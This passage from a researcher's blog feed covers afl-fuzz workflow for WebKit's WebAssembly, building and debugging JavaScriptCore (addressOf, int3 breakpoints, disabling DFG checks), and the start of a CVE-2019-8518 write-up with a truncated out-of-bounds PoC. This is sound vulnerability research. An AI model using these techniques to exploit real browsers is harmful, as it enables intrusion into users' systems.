JavaScriptWebAssemblyLen = <span class="built_in">strlen</span>(WebAssemblyLoadPrefix) + len * <span class="number">10</span> + <span class="built_in">strlen</span>(WebAssemblyLoadPostfix);</span><br><span class="line">  <span class="keyword">char</span> *JavaScriptWebAssembly = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(JavaScriptWebAssemblyLen);</span><br><span class="line">  <span class="built_in">memset</span>(JavaScriptWebAssembly, <span class="number">0</span>, JavaScriptWebAssemblyLen);</span><br><span class="line">  u32 currentP = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(JavaScriptWebAssembly, WebAssemblyLoadPrefix);</span><br><span class="line">  currentP += <span class="built_in">strlen</span>(WebAssemblyLoadPrefix);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">    <span class="built_in">sprintf</span>(formatBuffer, formatS, *((<span class="keyword">char</span> *)mem + i));</span><br><span class="line">    <span class="built_in">strcpy</span>(((<span class="keyword">char</span> *)JavaScriptWebAssembly + currentP), formatBuffer);</span><br><span class="line">    currentP += <span class="number">8</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(((<span class="keyword">char</span> *)JavaScriptWebAssembly + currentP), WebAssemblyLoadPostfix);</span><br><span class="line">  currentP += <span class="built_in">strlen</span>(WebAssemblyLoadPostfix);</span><br><span class="line">  JavaScriptWebAssembly[<span class="built_in">strlen</span>(JavaScriptWebAssembly)] = <span class="number">0</span>; </span><br><span class="line">  <span class="keyword">if</span>(printFlag == <span class="number">1</span>)&#123;</span><br><span class="line">    SAYF(cGRA <span class="string">"\n\n[GENERATED SAMPLE]\</span></span><br><span class="line"><span class="string">                   \n\n"</span> cRST);</span><br><span class="line">    printFlag = <span class="number">0</span>; </span><br><span class="line">    SAYF(TERM_CLEAR CURSOR_HIDE); </span><br><span class="line">  &#125;</span><br><span class="line">  ck_write(fd, JavaScriptWebAssembly, <span class="built_in">strlen</span>(JavaScriptWebAssembly), out_file);</span><br><span class="line">  <span class="built_in">free</span>(JavaScriptWebAssembly);</span><br><span class="line">  JavaScriptWebAssembly = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">if</span> (!out_file) &#123;</span><br><span class="line">    <span class="keyword">if</span> (ftruncate(fd, len)) PFATAL(<span class="string">"ftruncate() failed"</span>);</span><br><span class="line">    lseek(fd, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">  &#125; <span class="keyword">else</span> close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>借助这样的加层，afl-fuzz可以有效地对WebKit等浏览器的JavaScript引擎的WebAssembly模块进行fuzz。</p><h3 id="结论：建议的工作流"><a href="#结论：建议的工作流" class="headerlink" title="结论：建议的工作流"></a>结论：建议的工作流</h3><p>综上所述，使用afl-fuzz的高效的工作流实践并不复杂，完全是针对afl内部运行原理的直观反应。由于各阶段的耗时特点，可以总结出来高效的工作流：</p><p>（1）单例：</p><p>搜集样本 –&gt; cmin –&gt; 部分tmin –&gt; dirty模式单例fuzz  –&gt; cmin  –&gt; 单例fuzz –&gt; 回收queue</p><p>queue  –&gt; cmin –&gt; 部分tmin –&gt; dirty模式单例fuzz  –&gt; cmin–&gt; 单例fuzz –&gt; 回收queue </p><p>（2）并行：</p><p>搜集样本 –&gt; cmin –&gt; 部分tmin –&gt; 并行fuzz –&gt; 回收queue</p><p>queue  –&gt; cmin –&gt; 部分tmin –&gt; 并行fuzz –&gt; 回收queue </p><h3 id="另：编译器插装问题汇总"><a href="#另：编译器插装问题汇总" class="headerlink" title="另：编译器插装问题汇总"></a>另：编译器插装问题汇总</h3><ul><li>afl-2.52b之后，官方对其更新已经停止了。很多开源代码例如WebKit、Firefox使用了新的语法特性之后要求GCC-6以上才可以编译，而afl-2.52b与GCC-6无法兼容，会导致插装失败。这时候可以尝试llvm模式，使用afl-clang-fast。切换编译器之后编译命令可能略有不同，需要另查文档和试错。</li><li>使用afl-gcc、afl-clang等编译插装时，实装ASAN时命令有所改变，需要通过AFL_USE_ASAN=1环境变量传入，否则会发生一些冲突。</li><li>使用afl-gcc、afl-clang等编译插装时，实装ASAN时建议编译成32位，大多数时候64位下插装afl+ASAN插装组合都是不能使用的，因为占用内存过大。</li></ul><h3 id="另：其他改造"><a href="#另：其他改造" class="headerlink" title="另：其他改造"></a>另：其他改造</h3><p>本文围绕afl-fuzz暴力效率流，主要讲的是如何利用现有的afl-fuzz挖出漏洞。此外afl-fuzz本身还有很多可以改进的点，可以称之为”精细流”。例如CollAFL提出两点改进：</p><ul><li>增大路径bitmap的哈希表容量，减少碰撞；</li><li>根据路径覆盖优化选种策略。</li></ul><p>相关内容可参考：</p><p><a href="http://www.cnetsec.com/article/26263.html" target="_blank" rel="noopener">http://www.cnetsec.com/article/26263.html</a></p><p><a href="http://chao.100871.net/papers/oakland18.pdf" target="_blank" rel="noopener">http://chao.100871.net/papers/oakland18.pdf</a></p><p>此外，围绕afl-fuzz，还有很多衍生fuzzer和衍生工具，其中一部分被记录在了afl-fuzz官方文档的doc/sister_projects.txt下。比较有名的衍生fuzzer包括afl-go、WinAFL、afl-cov、kafl、android-afl等。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、概述&quot;&gt;&lt;a href=&quot;#一、概述&quot; class=&quot;headerlink&quot; title=&quot;一、概述&quot;&gt;&lt;/a&gt;一、概述&lt;/h3&gt;&lt;p&gt;关于afl-fuzz的原理和各种基本使用方法，已经有各位机智的网友写得比较完整了。本文的主要内容是，根据afl的一些特性，进
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XCode编译WebKit JavaScriptCore问题解决</title>
    <link href="https://dwfault.github.io/2019/12/20/XCode%E7%BC%96%E8%AF%91WebKit%20JavaScriptCore%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    <id>https://dwfault.github.io/2019/12/20/XCode编译WebKit JavaScriptCore问题解决/</id>
    <published>2019-12-20T04:13:28.920Z</published>
    <updated>2019-12-20T04:13:28.920Z</updated>
    
    <content type="html"><![CDATA[<p>个人感觉使用XCode编译调试JavaScriptCore是一种正确的方法，之前使用GCC太不方便了，耗费了很多很多时间。</p><p>（1）直接编译All Source，然后切换schema到jsc运行 。</p><p>（2）不要使用parrellize build 。</p><p>（3）run exit with xx、file not found等问题可以通过重试来解决 。</p><p>（4）放置老版本SDK进入目录 ▸ ⁨应用程序⁩ ▸ ⁨Xcode.app⁩ ▸ ⁨Contents⁩ ▸ ⁨Developer⁩ ▸ ⁨Platforms⁩ ▸ ⁨MacOSX.platform⁩ ▸ ⁨Developer⁩ ▸ SDKs⁨，重启XCode。</p><p> 修改的参数为：</p><ul><li><p>Base SDK</p></li><li><p>macOS Deployment Target</p><p>修改的目标有PAL、WebCore、WebKit、WebKitLegacy：</p><ul><li><img src="XCode编译WebKit JavaScriptCore问题解决.assets/image-20190119151730540.png" alt="image-20190119151730540"></li><li><img src="XCode编译WebKit JavaScriptCore问题解决.assets/image-20190119151757424.png" alt="image-20190119151757424"></li><li><img src="XCode编译WebKit JavaScriptCore问题解决.assets/image-20190119151812242.png" alt="image-20190119151812242"></li><li><img src="XCode编译WebKit JavaScriptCore问题解决.assets/image-20190119151832372.png" alt="image-20190119151832372"></li></ul></li></ul><p>（5）对较老的版本使用legacy build system：例如2019年在MacOS 10.14上使用XCode 10编译2018年1月30日版本时，就需要切换到legacy build system。</p><p>（6）Treat warnings as errors设置为否。</p><p>另：用新的编译器、操作系统编译老板本时，更多的问题是WebCore包含的多媒体部分和其他内容，它们引用了很多macOS SDK，就是因为它们JSC才编译不过。JSC本身不需要太多的依赖，奈何需要有一个WebCore的动态库，所以构建All Soource是一种简单粗暴的可行方法。 </p><p>老版本SDK的下载地址： </p><p><a href="https://github.com/phracker/MacOSX-SDKs" target="_blank" rel="noopener">https://github.com/phracker/MacOSX-SDKs</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;个人感觉使用XCode编译调试JavaScriptCore是一种正确的方法，之前使用GCC太不方便了，耗费了很多很多时间。&lt;/p&gt;
&lt;p&gt;（1）直接编译All Source，然后切换schema到jsc运行 。&lt;/p&gt;
&lt;p&gt;（2）不要使用parrellize build 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>WebKit JavaScriptCore的特殊调试技巧</title>
    <link href="https://dwfault.github.io/2019/12/20/WebKit%20JavaScriptCore%E7%9A%84%E7%89%B9%E6%AE%8A%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/"/>
    <id>https://dwfault.github.io/2019/12/20/WebKit JavaScriptCore的特殊调试技巧/</id>
    <published>2019-12-20T04:13:28.867Z</published>
    <updated>2019-12-20T04:13:28.867Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、jsc内置函数"><a href="#一、jsc内置函数" class="headerlink" title="一、jsc内置函数"></a>一、jsc内置函数</h3><p>jsc作为WebKit的JavaScriptCore的一个独立的可执行实体，其内置了一些特殊函数来帮助调试。这些函数位于JavaScriptCore/jsc.cpp，在finishCreation函数中通过addFunction函数注册：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">addFunction(vm, <span class="string">"debug"</span>, functionDebug, <span class="number">1</span>);</span><br><span class="line">addFunction(vm, <span class="string">"describe"</span>, functionDescribe, <span class="number">1</span>);</span><br><span class="line">addFunction(vm, <span class="string">"describeArray"</span>, functionDescribeArray, <span class="number">1</span>);</span><br><span class="line">addFunction(vm, <span class="string">"print"</span>, functionPrintStdOut, <span class="number">1</span>);</span><br><span class="line">addFunction(vm, <span class="string">"printErr"</span>, functionPrintStdErr, <span class="number">1</span>);</span><br><span class="line">addFunction(vm, <span class="string">"quit"</span>, functionQuit, <span class="number">0</span>);</span><br><span class="line">addFunction(vm, <span class="string">"gc"</span>, functionGCAndSweep, <span class="number">0</span>);</span><br><span class="line">addFunction(vm, <span class="string">"fullGC"</span>, functionFullGC, <span class="number">0</span>);</span><br><span class="line">addFunction(vm, <span class="string">"edenGC"</span>, functionEdenGC, <span class="number">0</span>);</span><br><span class="line">addFunction(vm, <span class="string">"forceGCSlowPaths"</span>, functionForceGCSlowPaths, <span class="number">0</span>);</span><br><span class="line">addFunction(vm, <span class="string">"gcHeapSize"</span>, functionHeapSize, <span class="number">0</span>);</span><br><span class="line">...</span><br><span class="line">addFunction(vm, <span class="string">"addressOf"</span>, functionAddressOf, <span class="number">1</span>);</span><br><span class="line">addFunction(vm, <span class="string">"run"</span>, functionRun, <span class="number">1</span>);</span><br><span class="line">addFunction(vm, <span class="string">"runString"</span>, functionRunString, <span class="number">1</span>);</span><br><span class="line">addFunction(vm, <span class="string">"load"</span>, functionLoad, <span class="number">1</span>);</span><br><span class="line">addFunction(vm, <span class="string">"loadString"</span>, functionLoadString, <span class="number">1</span>);</span><br><span class="line">addFunction(vm, <span class="string">"readFile"</span>, functionReadFile, <span class="number">2</span>);</span><br><span class="line">addFunction(vm, <span class="string">"read"</span>, functionReadFile, <span class="number">2</span>);</span><br><span class="line">...</span><br><span class="line">addFunction(vm, <span class="string">"jscStack"</span>, functionJSCStack, <span class="number">1</span>);</span><br><span class="line">addFunction(vm, <span class="string">"readline"</span>, functionReadline, <span class="number">0</span>);</span><br><span class="line">...</span><br><span class="line">addFunction(vm, <span class="string">"neverInlineFunction"</span>, functionNeverInlineFunction, <span class="number">1</span>);</span><br><span class="line">addFunction(vm, <span class="string">"noInline"</span>, functionNeverInlineFunction, <span class="number">1</span>);</span><br><span class="line">addFunction(vm, <span class="string">"noDFG"</span>, functionNoDFG, <span class="number">1</span>);</span><br><span class="line">addFunction(vm, <span class="string">"noFTL"</span>, functionNoFTL, <span class="number">1</span>);</span><br><span class="line">addFunction(vm, <span class="string">"noOSRExitFuzzing"</span>, functionNoOSRExitFuzzing, <span class="number">1</span>);</span><br><span class="line">addFunction(vm, <span class="string">"numberOfDFGCompiles"</span>, functionNumberOfDFGCompiles, <span class="number">1</span>);</span><br><span class="line">addFunction(vm, <span class="string">"jscOptions"</span>, functionJSCOptions, <span class="number">0</span>);</span><br><span class="line">addFunction(vm, <span class="string">"optimizeNextInvocation"</span>, functionOptimizeNextInvocation, <span class="number">1</span>);</span><br><span class="line">addFunction(vm, <span class="string">"reoptimizationRetryCount"</span>, functionReoptimizationRetryCount, <span class="number">1</span>);</span><br><span class="line">addFunction(vm, <span class="string">"transferArrayBuffer"</span>, functionTransferArrayBuffer, <span class="number">1</span>);</span><br><span class="line">addFunction(vm, <span class="string">"failNextNewCodeBlock"</span>, functionFailNextNewCodeBlock, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>这些函数不是ECMAScript标准涉及的函数，一般的JavaScript引擎实现中也不包含这些函数。可以认为这些函数是为了方便开发者而置入的。例如print函数用来打印变量到控制台，在nodejs等环境中对应console.log。这些函数很有用处，可以大大简化调试。例如函数describe、describeArray可以透露很多信息：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> split = <span class="string">'------'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a = [<span class="number">1</span>,<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">print(describe(a));</span><br><span class="line">print(split);</span><br><span class="line">print(describeArray(a));</span><br><span class="line">print(split);</span><br><span class="line">print(addressOf(a));</span><br><span class="line">print(<span class="string">'0x'</span> + f64_to_uint(addressOf(a)).toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">print(split);</span><br><span class="line">a.length = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">print(describe(a));</span><br><span class="line">print(split);</span><br><span class="line">print(describeArray(a));</span><br><span class="line">print(split);</span><br><span class="line">print(addressOf(a));</span><br><span class="line">print(<span class="string">'0x'</span> + f64_to_uint(addressOf(a)).toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f64_to_uint</span>(<span class="params">f64</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="keyword">new</span> <span class="built_in">Float64Array</span>([f64]).buffer);</span><br><span class="line">    <span class="keyword">if</span> (bytes.length != <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (debug)</span><br><span class="line">            print(<span class="string">"f64_to_u64 error."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> uint = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; bytes.length; i++) &#123;</span><br><span class="line">        uint += (bytes[bytes.length - i - <span class="number">1</span>] * <span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">0x38</span> - i * <span class="number">8</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> uint</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到如下内容，从中甚至可以看到对象的transition变化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Object: <span class="number">0x62d0000a4340</span> with butterfly <span class="number">0x62d0001a8010</span> (Structure <span class="number">0x62d00000ec30</span>:[Array, &#123;&#125;, CopyOnWriteArrayWithInt32, Proto:<span class="number">0x62d00007c0a0</span>, Leaf]), StructureID: <span class="number">102</span></span><br><span class="line">------</span><br><span class="line">&lt;Butterfly: <span class="number">0x62d0001a8010</span>; <span class="keyword">public</span> length: <span class="number">2</span>; <span class="built_in">vector</span> length: <span class="number">2</span>&gt;</span><br><span class="line">------</span><br><span class="line"><span class="number">5.3678005860554e-310</span></span><br><span class="line"><span class="number">0x62d0000a4340</span></span><br><span class="line">------</span><br><span class="line">Object: <span class="number">0x62d0000a4340</span> with butterfly <span class="number">0x62d000220008</span> (Structure <span class="number">0x62d00000ea00</span>:[Array, &#123;&#125;, ArrayWithInt32, Proto:<span class="number">0x62d00007c0a0</span>, Leaf]), StructureID: <span class="number">97</span></span><br><span class="line">------</span><br><span class="line">&lt;Butterfly: <span class="number">0x62d000220008</span>; <span class="keyword">public</span> length: <span class="number">3</span>; <span class="built_in">vector</span> length: <span class="number">3</span>&gt;</span><br><span class="line">------</span><br><span class="line"><span class="number">5.3678005860554e-310</span></span><br><span class="line"><span class="number">0x62d0000a4340</span></span><br></pre></td></tr></table></figure><p>也可以获得JS的执行栈：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    f64_to_uint(<span class="number">5.3678005860554e-310</span> + <span class="built_in">parseInt</span>(jscStack()));</span><br><span class="line">&#125;</span><br><span class="line">f();</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--&gt; Stack trace:</span><br><span class="line">    <span class="number">0</span>   jscStack@[native code]</span><br><span class="line">    <span class="number">1</span>   f@yuebao.js:<span class="number">36</span>:<span class="number">57</span></span><br><span class="line">    <span class="number">2</span>   global code@yuebao.js:<span class="number">39</span>:<span class="number">2</span></span><br></pre></td></tr></table></figure><p>另外，noDFG、noFTL等函数规定了特定js函数在JIT时的特定行为；gc、fullGC、edenGC可以控制垃圾回收等。由于依靠这些函数的漏洞触发不会被承认，所以这些函数看起来比较鸡肋，还是要手动触发jit、gc比较符合常理。因此这些函数在jsc中的高阶用法在这里不再讨论。</p><p>阅读这些函数可以理解很多基本类型的用法和关系，例如JSValue、jsNumber、jsString、Butterfly、Array、WTF::Vector。</p><h3 id="二、使用Arrary-prototype-slice下断点"><a href="#二、使用Arrary-prototype-slice下断点" class="headerlink" title="二、使用Arrary.prototype.slice下断点"></a>二、使用Arrary.prototype.slice下断点</h3><p>类似于IE漏洞分析中的tan等函数，Array.prototype.slice也可以被用作断点。目标函数位于JavaScriptCore/runtime/ArrayPrototype.cpp：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b arrayProtoFuncSlice</span><br></pre></td></tr></table></figure><p>在js中直接引用：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.slice([]);</span><br></pre></td></tr></table></figure><p>断下后会停在该函数的开头。</p><h3 id="三、自定义dbg-函数下断点"><a href="#三、自定义dbg-函数下断点" class="headerlink" title="三、自定义dbg()函数下断点"></a>三、自定义dbg()函数下断点</h3><p>可以使用x86 int3指令自定义一个断点函数dbg()进行调试。在jsc中自定义函数只需要三个步骤：</p><ul><li><p>声明函数</p></li><li><p>定义函数</p></li><li>注册函数<ul><li>addFunction的第二个参数是对应的js函数的名字，第四个参数是js函数的参数的个数。</li></ul></li></ul><p><img src="WebKit JavaScriptCore的特殊调试技巧.assets/image-20190103172422856-6507462.png" alt="image-20190103172422856"></p><p>自定义的Native函数参数统一为ExecState类型，这是一个为了确定上下文的类型。在使用addFunction注册函数时，第二个参数是该函数参数个数，这些参数可以通过ExecState类型的exec参数取得，因此dbg()函数还可以定义为有参数的函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> dbgBrCnt = <span class="number">0</span>;</span><br><span class="line"><span class="function">EncodedJSValue JSC_HOST_CALL <span class="title">functionDbg</span><span class="params">(ExecState* exec)</span></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> times = exec-&gt;uncheckedArgument(<span class="number">0</span>).toInteger(exec);</span><br><span class="line">    <span class="keyword">if</span>(dbgBrCnt &lt; times)&#123;&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">asm</span>(<span class="string">"int3;"</span>);</span><br><span class="line">    dbgBrCnt++;</span><br><span class="line">    <span class="keyword">return</span> JSValue::encode(jsUndefined());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此实现了一个条件断点，这样可以让函数在循环到某确定次数的时候陷入int3，比如下面定义的是一个到达1000次之后触发的断点函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbg(<span class="number">1000</span>);</span><br></pre></td></tr></table></figure><p>当然上述定义的断点适合简单的情况，只有一个断点的时候是可运行的。</p><p>functionDbg()的内容还可以更多样化地进行定制。这在调试JIT、垃圾回收等等复杂情况的时候尤其有用。</p><h3 id="四、为dbg-函数适配DFG-JIT"><a href="#四、为dbg-函数适配DFG-JIT" class="headerlink" title="四、为dbg()函数适配DFG JIT"></a>四、为dbg()函数适配DFG JIT</h3><p>上述所有内容都是JSC_HOST_CALL类型的静态函数，在JIT当中使用这些函数会不可避免地使栈回溯发生变化，因为存在一个从JITed代码跳转出来的过程；有时候还会为DFG JIT添加OSRExit的退出点，使得本来应该触发的漏洞在dbg()函数提前回退，导致漏洞无法触发。</p><p>JavaScriptCore的运行是一个比较复杂的过程，可以参考《MOSEC2018分享》中的内容，程序运行的上下文会经常在Baseline JIT和DFG JIT生成的代码之间切换。于是上文中的functionDbg()函数：</p><ul><li>基本不会影响到Baseline JIT代码生成，只是相当于在一段直线式程序中添加结点。<ul><li>调试时，正常通过该结点即可。</li></ul></li><li>会极大地影响DFG JIT代码生成。<ul><li>由DirectCall(DFG IR)调用，从JITed代码跳转出来<ul><li>后跟InvalidationPoint(DFG IR)结点</li><li>后跟CheckStructure(DFG IR)结点</li></ul></li></ul></li></ul><p>因此，dbg()函数可以保证插入点之前的代码的执行情况是与不插入的情况吻合的，但其后的代码执行逻辑可能会发生改变。例如，在JavaScriptCore JIT系统中最典型的类型混淆漏洞，其中有：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">前文</span><br><span class="line">类型混淆的赋值</span><br><span class="line">后文</span><br></pre></td></tr></table></figure><p>为了观察类型混淆漏洞，会在“类型混淆的赋值”之前插入一个DirectCall结点调用dbg()：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">前文</span><br><span class="line">DirectCall</span><br><span class="line">CheckStructure</span><br><span class="line">InvalidationPoint</span><br><span class="line">类型混淆的赋值</span><br><span class="line">后文</span><br></pre></td></tr></table></figure><p>于是在CheckStructure之后程序就进行了OSRExit，无法到达“类型混淆的赋值”，因此发生所谓观察者效应，调试失败。</p><p>为了解决这个问题，可以把CheckStructure这一DFG IR的编译过程注释掉，这样就可以随心所欲地下断点了：</p><p>JavaScriptCore/dfg/DFGSpeculativeJIT64.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SpeculativeJIT::compile(Node * node)</span><br><span class="line">    <span class="keyword">case</span> CheckStructure:&#123;</span><br><span class="line">        <span class="comment">//compileCheckStructure(node);</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，这样的情况不适用CheckStructure本身出问题的情况。</p><p>在其他的情况下，为了去掉InvalidationPoint还通过可以修改DirectCall这一DFG IR的读写属性标识，将其指明的Side Effect去掉：</p><p>JavaScriptCore/dfg/DFGClobberize.h</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (node-&gt;op())&#123;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">case</span> DirectCall:</span><br><span class="line">        <span class="comment">//read(World);</span></span><br><span class="line">        read(Heap);</span><br><span class="line">        <span class="comment">//write(Heap);</span></span><br><span class="line">        write(SideState);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="五、DFG-JIT代码断点"><a href="#五、DFG-JIT代码断点" class="headerlink" title="五、DFG JIT代码断点"></a>五、DFG JIT代码断点</h3><p>更直观的方法，是在DFG代码生成的位置下断点：</p><p><img src="WebKit JavaScriptCore的特殊调试技巧.assets/image-20190103172811046-6507691.png" alt="image-20190103172811046"></p><p>需要参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--dumpDFGDisassembly=<span class="literal">true</span></span><br></pre></td></tr></table></figure><p>配合内存dump+反汇编器分析更容易。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、jsc内置函数&quot;&gt;&lt;a href=&quot;#一、jsc内置函数&quot; class=&quot;headerlink&quot; title=&quot;一、jsc内置函数&quot;&gt;&lt;/a&gt;一、jsc内置函数&lt;/h3&gt;&lt;p&gt;jsc作为WebKit的JavaScriptCore的一个独立的可执行实体，其内置了
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CVE-2019-8518 FTL LICM GetByVal hoisted OOB</title>
    <link href="https://dwfault.github.io/2019/12/20/CVE-2019-8518%20FTL%20LICM%20GetByVal%20hoisted%20OOB/"/>
    <id>https://dwfault.github.io/2019/12/20/CVE-2019-8518 FTL LICM GetByVal hoisted OOB/</id>
    <published>2019-12-20T04:13:28.866Z</published>
    <updated>2019-12-20T04:13:28.866Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-References-and-PoC"><a href="#1-References-and-PoC" class="headerlink" title="1. References and PoC"></a>1. References and PoC</h1><p>This bug was found by saelo(Thanks saelo for always being really great!). </p><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1775" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1775</a></p><p><a href="https://github.com/WebKit/webkit/commit/62f770031bdb15b59041257e60ab93765d5ee6ca" target="_blank" rel="noopener">https://github.com/WebKit/webkit/commit/62f770031bdb15b59041257e60ab93765d5ee6ca</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> v3 = [<span class="number">1337</span>, <span class="number">1337</span>, <span class="number">1337</span>, <span class="number">1337</span>];</span><br><span class="line"><span class="keyword">const</span> v6 = [<span class="number">1337</span>, <span class="number">1337</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">v7</span>(<span class="params">v8</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> v9 <span class="keyword">in</span> v8) &#123;</span><br><span class="line">        v8.a = <span class="number">42</span>;</span><br><span class="line">        <span class="keyword">const</span> v10 = v8[<span class="number">-698666199</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) 